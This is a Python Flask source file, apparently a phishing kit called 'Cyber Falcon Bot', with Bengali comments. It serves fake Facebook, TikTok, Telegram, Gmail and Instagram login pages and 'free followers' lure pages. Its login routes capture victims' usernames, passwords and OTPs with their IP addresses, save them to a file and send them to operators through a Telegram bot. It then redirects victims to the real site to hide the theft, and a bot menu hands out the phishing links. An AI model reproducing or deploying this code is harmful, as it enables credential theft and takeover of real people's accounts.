from flask import Flask, request, jsonify, render_template, redirect
import json
import logging
import requests
import socket
import os
import time
import threading
import asyncio
from config import PORT, TELEGRAM_BOT_TOKEN

# ============= কনফিগারেশন =============
app = Flask(__name__)

current_page = "facebook"
public_url = None
active_chat_ids = set()
DATA_FILE = "bot_data.json"
WEBHOOK_SECRET = "cyber_falcon_2025_secure"  # আপনার পছন্দের যেকোনো স্ট্রিং দিন

# ============= ডাটা ম্যানেজমেন্ট =============
def load_data():
    global public_url, active_chat_ids
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                public_url = data.get('public_url')
                active_chat_ids = set(data.get('active_users', []))
                print(f"✅ ডাটা লোড করা হয়েছে: URL={public_url}, Users={len(active_chat_ids)}")
    except Exception as e:
        print(f"ডাটা লোড করতে ব্যর্থ: {e}")

def save_data():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump({
                'public_url': public_url,
                'active_users': list(active_chat_ids)
            }, f)
    except Exception as e:
        print(f"ডাটা সেভ করতে ব্যর্থ: {e}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ============= টেলিগ্রাম মেসেজ পাঠানো =============
def send_to_telegram(data):
    platform_info = {
        "facebook": {"name": "Facebook", "icon": "📘"},
        "tiktok": {"name": "TikTok", "icon": "🎵"},
        "telegram": {"name": "Telegram", "icon": "📱"},
        "gmail": {"name": "Gmail", "icon": "📧"},
        "instagram": {"name": "Instagram", "icon": "📸"},
        "facebook_followers": {"name": "Facebook Followers", "icon": "🎯"},
        "whatsapp_groups": {"name": "WhatsApp Groups", "icon": "🤤"},
        "tiktok_boost": {"name": "TikTok Booster", "icon": "🚀"},
        "tiktok_followers": {"name": "TikTok Followers", "icon": "💎"}
    }
    
    page_type = data.get('pageType', 'unknown')
    platform = platform_info.get(page_type, {"name": page_type, "icon": "🌐"})
    
    message = f"""
🦅🥷 {platform['name']} Login Information 🦅🥷

{platform['icon']} Platform: {platform['name']}
👤 Username/Email: {data.get('username', data.get('phone', 'N/A'))}
🔑 Password/OTP: {data.get('password', data.get('otp', 'N/A'))}
🌐 IP Address: {data.get('ipAddress', 'Unknown')}
📱 User Agent: {data.get('userAgent', 'Unknown')}
⏰ Time: {data.get('timestamp', time.strftime("%Y-%m-%d %H:%M:%S"))}
"""
    
    if 'groupName' in data:
        message += f"👥 Group: {data['groupName']}\n"
    if 'video_link' in data and data['video_link']:
        message += f"🎥 Video Link: {data['video_link']}\n"
    if 'service_type' in data:
        message += f"📦 Service: {data['service_type']}\n"
    if 'email' in data and data['email']:
        message += f"📧 Email: {data['email']}\n"
    message += "\n⚡ Cyber Falcon Bot ⚡"
    
    for chat_id in active_chat_ids:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {'chat_id': chat_id, 'text': message}
        
        try:
            response = requests.post(url, data=payload)
            print(f"📢 Message sent to chat_id {chat_id}: {response.status_code}")
        except Exception as e:
            print(f"❌ Error sending to chat_id {chat_id}: {e}")

def add_chat_id(chat_id):
    active_chat_ids.add(chat_id)
    save_data()
    print(f"✅ Added chat_id: {chat_id}")
    print(f"📊 Total users: {len(active_chat_ids)}")

# ============= ওয়েবহুক সেটআপ =============
def set_webhook():
    """Render ডিপ্লয়ের পর ওয়েবহুক সেটআপ করুন"""
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if not render_url:
        print("⚠️ RENDER_EXTERNAL_URL পাওয়া যায়নি")
        return False
    
    webhook_url = f"{render_url}/webhook/{WEBHOOK_SECRET}"
    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook"
    
    try:
        response = requests.post(api_url, json={
            'url': webhook_url,
            'drop_pending_updates': True,
            'secret_token': WEBHOOK_SECRET
        })
        if response.status_code == 200 and response.json().get('ok'):
            print(f"✅ ওয়েবহুক সেট করা হয়েছে: {webhook_url}")
            return True
        else:
            print(f"❌ ওয়েবহুক সেট করতে ব্যর্থ: {response.text}")
            return False
    except Exception as e:
        print(f"❌ ওয়েবহুক সেট করতে ব্যর্থ: {e}")
        return False

# ============= ফ্লাস্ক রাউট =============
@app.route('/')
def index():
    global current_page
    template_files = {
        "facebook": "facebook.html",
        "tiktok": "tiktok.html", 
        "telegram": "telegram.html",
        "gmail": "gmail.html",
        "instagram": "instagram.html"
    }
    template_file = template_files.get(current_page, "facebook.html")
    template_path = os.path.join('templates', template_file)
    if not os.path.exists(template_path):
        return f"No template found: {template_file}", 500
    return render_template(template_file)

@app.route('/set_page/<page_type>')
def set_page(page_type):
    global current_page
    if page_type in ["facebook", "tiktok", "telegram", "gmail", "instagram"]:
        current_page = page_type
        return f"Page set to {current_page}"
    return "Invalid page"

@app.route('/get_ngrok_url')
def get_ngrok_url_api():
    global public_url
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url and not public_url:
        public_url = render_url
    return jsonify({
        'public_url': public_url,
        'active_users': len(active_chat_ids),
        'current_page': current_page
    })

@app.route('/set_public_url', methods=['POST'])
def set_public_url():
    global public_url
    data = request.json
    new_url = data.get('url')
    if new_url and new_url.startswith('http'):
        public_url = new_url
        save_data()
        return jsonify({'status': 'success', 'public_url': public_url})
    return jsonify({'status': 'error'}), 400

@app.route('/add_user/<chat_id>')
def add_user(chat_id):
    try:
        add_chat_id(int(chat_id))
        return jsonify({'status': 'success'})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/login', methods=['POST'])
def login():
    data = {
        'username': request.form['username'],
        'password': request.form['password'],
        'ipAddress': request.remote_addr,
        'userAgent': request.headers.get('User-Agent'),
        'pageType': current_page,
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
    }
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    send_to_telegram(data)
    
    redirect_urls = {
        "tiktok": "https://www.tiktok.com/",
        "telegram": "https://web.telegram.org/",
        "gmail": "https://mail.google.com/",
        "instagram": "https://www.instagram.com/",
        "facebook": "https://www.facebook.com/"
    }
    return redirect(redirect_urls.get(current_page, "https://www.google.com/"))

@app.route('/login2', methods=['POST'])
def login2():
    data = {}
    for key in request.form:
        data[key] = request.form[key]
    data['ipAddress'] = request.remote_addr
    data['userAgent'] = request.headers.get('User-Agent')
    data['timestamp'] = time.strftime("%Y-%m-%d %H:%M:%S")
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    send_to_telegram(data)
    
    redirect_urls = {
        "facebook_followers": "https://facebook.com",
        "whatsapp_groups": "https://web.whatsapp.com",
        "tiktok_boost": "https://tiktok.com",
        "tiktok_followers": "https://tiktok.com",
        "default": "https://google.com"
    }
    return redirect(redirect_urls.get(data.get('pageType', 'default'), redirect_urls["default"]))

@app.route('/facebook_followers')
def facebook_followers():
    try:
        return render_template("facebook_followers.html")
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/whatsapp_groups')
def whatsapp_groups():
    try:
        return render_template("whatsapp_groups.html")
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/tiktok_boost')
def tiktok_boost():
    try:
        return render_template("tiktok_boost.html")
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/tiktok_followers')
def tiktok_followers():
    try:
        return render_template("tiktok_followers.html")
    except Exception as e:
        return f"Error: {e}", 500

# ============= ওয়েবহুক এন্ডপয়েন্ট =============
@app.route(f'/webhook/{WEBHOOK_SECRET}', methods=['POST'])
def webhook():
    """টেলিগ্রাম থেকে ওয়েবহুক গ্রহণ করে"""
    try:
        # সিকিউরিটি: সিক্রেট টোকেন ভেরিফাই করুন
        secret_token = request.headers.get('X-Telegram-Bot-Api-Secret-Token')
        if secret_token != WEBHOOK_SECRET:
            print("⚠️ Invalid secret token")
            return jsonify({"status": "unauthorized"}), 401
        
        # আপডেট ডেটা নিন
        update_data = request.get_json()
        if not update_data:
            return jsonify({"status": "ok"})
        
        # বার্তা প্রক্রিয়াকরণ
        if 'message' in update_data:
            msg = update_data['message']
            chat_id = msg['chat']['id']
            
            # কমান্ড হ্যান্ডলিং
            if 'text' in msg:
                text = msg['text']
                if text == '/start' or text == '/link':
                    # টেলিগ্রামে মেসেজ পাঠান (সরাসরি API কল)
                    send_telegram_message(chat_id, get_start_message(chat_id), get_start_keyboard())
        
        elif 'callback_query' in update_data:
            cb = update_data['callback_query']
            chat_id = cb['message']['chat']['id']
            message_id = cb['message']['message_id']
            data = cb['data']
            callback_id = cb['id']
            
            # ক্যালব্যাকের উত্তর দিন
            answer_callback_query(callback_id)
            
            # ক্যালব্যাক ডাটা প্রসেস করুন
            handle_callback_data(chat_id, message_id, data)
        
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"ওয়েবহুক প্রসেসিং এ error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/health')
def health():
    """হেলথ চেক এন্ডপয়েন্ট (Render-এর জন্য)"""
    return jsonify({"status": "healthy", "bot": "running"}), 200

# ============= টেলিগ্রাম API হেল্পার ফাংশন =============
def send_telegram_message(chat_id, text, reply_markup=None):
    """টেলিগ্রামে মেসেজ পাঠান"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error sending message: {e}")

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    """টেলিগ্রামের মেসেজ এডিট করুন"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error editing message: {e}")

def answer_callback_query(callback_id, text=None):
    """ক্যালব্যাক কোয়েরির উত্তর দিন"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    payload = {'callback_query_id': callback_id}
    if text:
        payload['text'] = text
    
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error answering callback: {e}")

# ============= বট মেসেজ জেনারেটর =============
def get_start_message(chat_id):
    """ইউজারের জন্য স্টার্ট মেসেজ তৈরি করুন"""
    try:
        requests.get(f"http://localhost:{PORT}/add_user/{chat_id}", timeout=3)
    except:
        pass
    
    public_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    return f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙒𝙚𝙡𝙘𝙤𝙢𝙚!

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""

def get_start_keyboard():
    """স্টার্ট মেনুর কীবোর্ড"""
    return {
        "inline_keyboard": [
            [{"text": "🌐 All Mane page", "callback_data": "All_Mane_page"}],
            [{"text": "📢 advance page", "callback_data": "All_advance_page"}],
            [{"text": "🦅 Status", "callback_data": "status"},
             {"text": "🥷 community", "url": "https://t.me/+j8x9Tp4CGa80ZmM1"}]
        ]
    }

def get_all_menu_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📘 Facebook", "callback_data": "_facebook"}],
            [{"text": "🤤 TikTok", "callback_data": "_tiktok"}],
            [{"text": "✈️ Telegram", "callback_data": "_telegram"}],
            [{"text": "📧 Gmail", "callback_data": "_gmail"}],
            [{"text": "📷 Instagram", "callback_data": "_instagram"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}]
        ]
    }

def get_advance_menu_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🎯 ফ্রি ফলোয়ার", "callback_data": "_at"}],
            [{"text": "📞 ফ্রি কল / Whatsapp", "callback_data": "_ai"}],
            [{"text": "📢 TikTok বুস্টার", "callback_data": "_ad"}],
            [{"text": "🚀 TikTok ফলোয়ার", "callback_data": "_go"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}]
        ]
    }

def get_page_link_keyboard(page_url, back_callback):
    return {
        "inline_keyboard": [
            [{"text": "🌐 Open Public URL", "url": page_url}],
            [{"text": "🔙 Back", "callback_data": back_callback}]
        ]
    }

# ============= ক্যালব্যাক হ্যান্ডলার =============
def handle_callback_data(chat_id, message_id, data):
    """ক্যালব্যাক ডাটা প্রসেস করুন"""
    public_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')
    
    if data == "All_Mane_page":
        edit_telegram_message(chat_id, message_id, "😈 All Mane page Platforms\n\nSelect a platform:", get_all_menu_keyboard())
    
    elif data == "All_advance_page":
        edit_telegram_message(chat_id, message_id, "📢 advance page Menu\n\nSelect an option:", get_advance_menu_keyboard())
    
    elif data == "main_menu":
        edit_telegram_message(chat_id, message_id, get_start_message(chat_id), get_start_keyboard())
    
    elif data == "status":
        status_msg = f"""Bot Status

🦅 Bot Status: 🟢 Active
🦅 **Public URL:** `{public_url}`
🔌 **Port:** {PORT}

🛡️ All systems operational."""
        edit_telegram_message(chat_id, message_id, status_msg, {"inline_keyboard": [[{"text": "🔙 Back", "callback_data": "main_menu"}]]})
    
    elif data in ["_facebook", "_tiktok", "_telegram", "_gmail", "_instagram"]:
        page_names = {
            "_facebook": "Facebook",
            "_tiktok": "TikTok", 
            "_telegram": "Telegram",
            "_gmail": "Gmail",
            "_instagram": "Instagram"
        }
        page_name = page_names.get(data, "Page")
        page_url = f"{public_url}/{data[1:]}"
        edit_telegram_message(chat_id, message_id, f"{page_name} Link\n\n🌐 **Public URL:**\n`{page_url}`", get_page_link_keyboard(page_url, "All_Mane_page"))
    
    elif data == "_at":
        page_url = f"{public_url}/facebook_followers"
        edit_telegram_message(chat_id, message_id, f"🎯 ফ্রি ফেসবুক ফলোয়ার\n\n🔗 {page_url}", get_page_link_keyboard(page_url, "All_advance_page"))
    
    elif data == "_ai":
        page_url = f"{public_url}/whatsapp_groups"
        edit_telegram_message(chat_id, message_id, f"📞 ফ্রি কল / হোয়াটসঅ্যাপ গ্রুপ\n\n🔗 {page_url}", get_page_link_keyboard(page_url, "All_advance_page"))
    
    elif data == "_ad":
        page_url = f"{public_url}/tiktok_boost"
        edit_telegram_message(chat_id, message_id, f"📢 TikTok ভিউ+লাইক বুস্টার\n\n🔗 {page_url}", get_page_link_keyboard(page_url, "All_advance_page"))
    
    elif data == "_go":
        page_url = f"{public_url}/tiktok_followers"
        edit_telegram_message(chat_id, message_id, f"🚀 TikTok ফ্রি ফলোয়ার\n\n🔗 {page_url}", get_page_link_keyboard(page_url, "All_advance_page"))
    
    else:
        print(f"Unknown callback data: {data}")

# ============= বট থ্রেড (পোলিং ব্যাকআপ) =============
def run_bot_polling():
    """ব্যাকআপ হিসেবে পোলিং চালান (যদি ওয়েবহুক কাজ না করে)"""
    try:
        from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
        from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
        
        # সিম্পল পোলিং বট (ওয়েবহুক ছাড়া)
        application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        
        async def start_poll(update: Update, context: ContextTypes.DEFAULT_TYPE):
            chat_id = update.message.chat.id
            send_telegram_message(chat_id, get_start_message(chat_id), get_start_keyboard())
        
        async def handle_callback_poll(update: Update, context: ContextTypes.DEFAULT_TYPE):
            query = update.callback_query
            await query.answer()
            handle_callback_data(query.message.chat.id, query.message.message_id, query.data)
        
        application.add_handler(CommandHandler("start", start_poll))
        application.add_handler(CommandHandler("link", start_poll))
        application.add_handler(CallbackQueryHandler(handle_callback_poll))
        
        print("🦅 Telegram Bot (Polling Mode) Starting...")
        application.run_polling(allowed_updates=["message", "callback_query"])
    except Exception as e:
        print(f"Polling bot failed: {e}")

# ============= মেইন =============
if __name__ == '__main__':
    load_data()
    
    # Render URL সেট করুন
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url:
        public_url = render_url
        print(f"🥷 Render URL: {public_url}")
    
    # ওয়েবহুক সেটআপ করুন (শুধু মেইন থ্রেডে)
    set_webhook()
    
    # ব্যাকআপ হিসেবে পোলিং থ্রেড চালান (ওয়েবহুক কাজ না করলে বট চলবে)
    bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
    bot_thread.start()
    print("✅ Telegram বট থ্রেড শুরু হয়েছে")
    
    local_ip = get_local_ip()
    print(f"\n{'='*50}")
    print(f"🚀 Cyber Falcon Bot - Flask সার্ভার")
    print(f"{'='*50}")
    print(f"📍 লোকাল URL: http://{local_ip}:5000")
    print(f"🌐 পাবলিক URL: {public_url if public_url else 'সেট করা হয়নি'}")
    print(f"📄 বর্তমান পেজ: {current_page}")
    print(f"👥 সক্রিয় ইউজার: {len(active_chat_ids)}")
    print(f"🔐 Webhook Secret: {WEBHOOK_SECRET}")
    print(f"{'='*50}")
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
